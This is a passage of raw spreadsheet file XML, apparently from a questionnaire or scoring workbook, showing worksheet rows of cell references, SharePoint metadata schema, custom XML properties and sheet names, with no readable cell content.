      <c r="G2" s="25"/>
      <c r="H2" s="32"/>
    </row>
    <row r="3" spans="1:8" ht="115.2" hidden="1">
      <c r="A3" s="26" t="s">
        <v>4</v>
      </c>
      <c r="B3" s="26">
        <v>1.2</v>
      </c>
      <c r="C3" s="26" t="s">
        <v>47</v>
      </c>
      <c r="D3" s="26"/>
      <c r="E3" s="26" t="s">
        <v>72</v>
      </c>
      <c r="F3" s="26"/>
      <c r="G3" s="26"/>
      <c r="H3" s="25"/>
    </row>
    <row r="4" spans="1:8" ht="86.4" hidden="1">
      <c r="A4" s="25" t="s">
        <v>4</v>
      </c>
      <c r="B4" s="25">
        <v>1.3</v>
      </c>
      <c r="C4" s="25" t="s">
        <v>48</v>
      </c>
      <c r="D4" s="25"/>
      <c r="E4" s="25" t="s">
        <v>188</v>
      </c>
      <c r="F4" s="25"/>
      <c r="G4" s="26"/>
      <c r="H4" s="25" t="s">
        <v>189</v>
      </c>
    </row>
    <row r="5" spans="1:8" ht="72" hidden="1">
      <c r="A5" s="26" t="s">
        <v>4</v>
      </c>
      <c r="B5" s="26">
        <v>1.6</v>
      </c>
      <c r="C5" s="26" t="s">
        <v>49</v>
      </c>
      <c r="D5" s="26"/>
      <c r="E5" s="26" t="s">
        <v>50</v>
      </c>
      <c r="F5" s="26"/>
      <c r="G5" s="26"/>
      <c r="H5" s="26" t="s">
        <v>189</v>
      </c>
    </row>
    <row r="6" spans="1:8" ht="86.4">
      <c r="A6" s="25" t="s">
        <v>4</v>
      </c>
      <c r="B6" s="25">
        <v>1.7</v>
      </c>
      <c r="C6" s="25" t="s">
        <v>51</v>
      </c>
      <c r="D6" s="25"/>
      <c r="E6" s="25" t="s">
        <v>52</v>
      </c>
      <c r="F6" s="25" t="s">
        <v>190</v>
      </c>
      <c r="G6" s="25" t="s">
        <v>191</v>
      </c>
      <c r="H6" s="25"/>
    </row>
    <row r="7" spans="1:8" ht="72">
      <c r="A7" s="26" t="s">
        <v>10</v>
      </c>
      <c r="B7" s="26">
        <v>2.1</v>
      </c>
      <c r="C7" s="26" t="s">
        <v>31</v>
      </c>
      <c r="D7" s="26"/>
      <c r="E7" s="26" t="s">
        <v>32</v>
      </c>
      <c r="F7" s="26" t="s">
        <v>192</v>
      </c>
      <c r="G7" s="26" t="s">
        <v>193</v>
      </c>
      <c r="H7" s="25"/>
    </row>
    <row r="8" spans="1:8" ht="129.6">
      <c r="A8" s="25" t="s">
        <v>10</v>
      </c>
      <c r="B8" s="25">
        <v>2.2000000000000002</v>
      </c>
      <c r="C8" s="25" t="s">
        <v>33</v>
      </c>
      <c r="D8" s="25"/>
      <c r="E8" s="25" t="s">
        <v>66</v>
      </c>
      <c r="F8" s="25" t="s">
        <v>192</v>
      </c>
      <c r="G8" s="25" t="s">
        <v>194</v>
      </c>
      <c r="H8" s="25"/>
    </row>
    <row r="9" spans="1:8" ht="144">
      <c r="A9" s="26" t="s">
        <v>10</v>
      </c>
      <c r="B9" s="26">
        <v>2.2999999999999998</v>
      </c>
      <c r="C9" s="26" t="s">
        <v>34</v>
      </c>
      <c r="D9" s="26" t="s">
        <v>35</v>
      </c>
      <c r="E9" s="26" t="s">
        <v>74</v>
      </c>
      <c r="F9" s="26" t="s">
        <v>195</v>
      </c>
      <c r="G9" s="26" t="s">
        <v>286</v>
      </c>
      <c r="H9" s="25"/>
    </row>
    <row r="10" spans="1:8" ht="86.4">
      <c r="A10" s="25" t="s">
        <v>10</v>
      </c>
      <c r="B10" s="25">
        <v>2.4</v>
      </c>
      <c r="C10" s="25" t="s">
        <v>11</v>
      </c>
      <c r="D10" s="25"/>
      <c r="E10" s="25" t="s">
        <v>75</v>
      </c>
      <c r="F10" s="25" t="s">
        <v>196</v>
      </c>
      <c r="G10" s="25"/>
      <c r="H10" s="25"/>
    </row>
    <row r="11" spans="1:8" ht="115.2">
      <c r="A11" s="26" t="s">
        <v>10</v>
      </c>
      <c r="B11" s="26">
        <v>2.5</v>
      </c>
      <c r="C11" s="26" t="s">
        <v>56</v>
      </c>
      <c r="D11" s="26"/>
      <c r="E11" s="26" t="s">
        <v>67</v>
      </c>
      <c r="F11" s="26" t="s">
        <v>192</v>
      </c>
      <c r="G11" s="26"/>
      <c r="H11" s="25"/>
    </row>
    <row r="12" spans="1:8" ht="86.4" hidden="1">
      <c r="A12" s="25" t="s">
        <v>8</v>
      </c>
      <c r="B12" s="25" t="s">
        <v>29</v>
      </c>
      <c r="C12" s="25" t="s">
        <v>30</v>
      </c>
      <c r="D12" s="25"/>
      <c r="E12" s="25" t="s">
        <v>188</v>
      </c>
      <c r="F12" s="25"/>
      <c r="G12" s="25"/>
      <c r="H12" s="25" t="s">
        <v>197</v>
      </c>
    </row>
    <row r="13" spans="1:8" ht="86.4" hidden="1">
      <c r="A13" s="26" t="s">
        <v>12</v>
      </c>
      <c r="B13" s="26" t="s">
        <v>36</v>
      </c>
      <c r="C13" s="26" t="s">
        <v>37</v>
      </c>
      <c r="D13" s="26"/>
      <c r="E13" s="26" t="s">
        <v>188</v>
      </c>
      <c r="F13" s="26"/>
      <c r="G13" s="25"/>
      <c r="H13" s="26" t="s">
        <v>197</v>
      </c>
    </row>
    <row r="14" spans="1:8" ht="86.4">
      <c r="A14" s="25" t="s">
        <v>12</v>
      </c>
      <c r="B14" s="25" t="s">
        <v>39</v>
      </c>
      <c r="C14" s="25" t="s">
        <v>40</v>
      </c>
      <c r="D14" s="25"/>
      <c r="E14" s="25" t="s">
        <v>41</v>
      </c>
      <c r="F14" s="25" t="s">
        <v>192</v>
      </c>
      <c r="G14" s="25"/>
      <c r="H14" s="25"/>
    </row>
    <row r="15" spans="1:8" ht="86.4" hidden="1">
      <c r="A15" s="26" t="s">
        <v>12</v>
      </c>
      <c r="B15" s="26" t="s">
        <v>42</v>
      </c>
      <c r="C15" s="26" t="s">
        <v>43</v>
      </c>
      <c r="D15" s="26"/>
      <c r="E15" s="26" t="s">
        <v>188</v>
      </c>
      <c r="F15" s="26"/>
      <c r="G15" s="25"/>
      <c r="H15" s="26" t="s">
        <v>197</v>
      </c>
    </row>
    <row r="16" spans="1:8" ht="86.4">
      <c r="A16" s="25" t="s">
        <v>12</v>
      </c>
      <c r="B16" s="25" t="s">
        <v>58</v>
      </c>
      <c r="C16" s="25" t="s">
        <v>59</v>
      </c>
      <c r="D16" s="25"/>
      <c r="E16" s="25" t="s">
        <v>188</v>
      </c>
      <c r="F16" s="25" t="s">
        <v>192</v>
      </c>
      <c r="G16" s="25"/>
      <c r="H16" s="25"/>
    </row>
    <row r="17" spans="1:8" ht="86.4" hidden="1">
      <c r="A17" s="26" t="s">
        <v>14</v>
      </c>
      <c r="B17" s="26" t="s">
        <v>60</v>
      </c>
      <c r="C17" s="26" t="s">
        <v>61</v>
      </c>
      <c r="D17" s="26"/>
      <c r="E17" s="26" t="s">
        <v>188</v>
      </c>
      <c r="F17" s="26" t="s">
        <v>198</v>
      </c>
      <c r="G17" s="26" t="s">
        <v>199</v>
      </c>
      <c r="H17" s="25"/>
    </row>
    <row r="18" spans="1:8" ht="86.4" hidden="1">
      <c r="A18" s="25" t="s">
        <v>14</v>
      </c>
      <c r="B18" s="25" t="s">
        <v>18</v>
      </c>
      <c r="C18" s="25" t="s">
        <v>19</v>
      </c>
      <c r="D18" s="25"/>
      <c r="E18" s="25" t="s">
        <v>188</v>
      </c>
      <c r="F18" s="25" t="s">
        <v>198</v>
      </c>
      <c r="G18" s="25" t="s">
        <v>200</v>
      </c>
      <c r="H18" s="25"/>
    </row>
    <row r="19" spans="1:8" ht="86.4" hidden="1">
      <c r="A19" s="26" t="s">
        <v>14</v>
      </c>
      <c r="B19" s="26" t="s">
        <v>20</v>
      </c>
      <c r="C19" s="26" t="s">
        <v>21</v>
      </c>
      <c r="D19" s="26"/>
      <c r="E19" s="26" t="s">
        <v>188</v>
      </c>
      <c r="F19" s="26" t="s">
        <v>198</v>
      </c>
      <c r="G19" s="26" t="s">
        <v>200</v>
      </c>
      <c r="H19" s="25"/>
    </row>
    <row r="20" spans="1:8" ht="57.6">
      <c r="A20" s="31" t="s">
        <v>14</v>
      </c>
      <c r="B20" s="31" t="s">
        <v>22</v>
      </c>
      <c r="C20" s="31" t="s">
        <v>23</v>
      </c>
      <c r="D20" s="31"/>
      <c r="E20" s="31" t="s">
        <v>24</v>
      </c>
      <c r="F20" s="31" t="s">
        <v>192</v>
      </c>
      <c r="G20" s="31"/>
      <c r="H20" s="31" t="s">
        <v>201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A343155BE8F74AA16D9CB0579F9185" ma:contentTypeVersion="7" ma:contentTypeDescription="Create a new document." ma:contentTypeScope="" ma:versionID="7c7ef1a654042c637ae30c71ce2891d8">
  <xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:p="http://schemas.microsoft.com/office/2006/metadata/properties" xmlns:ns2="dfd68c33-b980-43e7-8014-3d70b8dadea0" targetNamespace="http://schemas.microsoft.com/office/2006/metadata/properties" ma:root="true" ma:fieldsID="5bb4f118ea1b44c088a3b2fb6fe0e594" ns2:_="">
    <xsd:import namespace="dfd68c33-b980-43e7-8014-3d70b8dadea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d68c33-b980-43e7-8014-3d70b8dade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BE5BD18-635A-4E59-9443-B6A7020989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d68c33-b980-43e7-8014-3d70b8dade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A59419-872B-4A4E-97E6-CFA035E1F894}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/sharepoint/v3/contenttype/forms"/>
  </ds:schemaRefs>
</ds:datastoreItem>
</file>

<file path=customXml/itemProps3.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{BA7016F1-5FE8-49D3-8439-F1032A545183}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/infopath/2007/PartnerControls"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/2006/documentManagement/types"/>
    <ds:schemaRef ds:uri="http://purl.org/dc/elements/1.1/"/>
    <ds:schemaRef ds:uri="http://purl.org/dc/terms/"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/2006/metadata/properties"/>
    <ds:schemaRef ds:uri="http://www.w3.org/XML/1998/namespace"/>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a7295cc1-d279-42ac-ab4d-3b0f4fece050}" enabled="1" method="Privileged" siteId="{a19f121d-81e1-4858-a9d8-736e267fd4c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FinalScoringQuestionList</vt:lpstr>
      <vt:lpstr>FinalManualQuestionnaire</vt:lpstr>
      <vt:lpstr>AggregatedManualEval</vt:lpstr>
      <vt:lpstr>Manual Questionnaire Template</vt:lpstr>
      <vt:lpstr>Manual Questionnaire 5</vt:lpstr>
      <vt:lpstr>Manual Questionnaire 1</vt:lpstr>
      <vt:lpstr>Manual Questionnaire 2</vt:lpstr>
      <vt:lpstr>Manual Questionnaire 3</vt:lpstr>
      <vt:lpstr>Manual Questionnaire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dcterms:created xsi:type="dcterms:W3CDTF">2026-01-06T21:23:01Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-30T19:40:25Z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0x01010092A343155BE8F74AA16D9CB0579F9185</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="MediaServiceImageTags">
    <vt:lpwstr/>
  </property>
</Properties>
</file>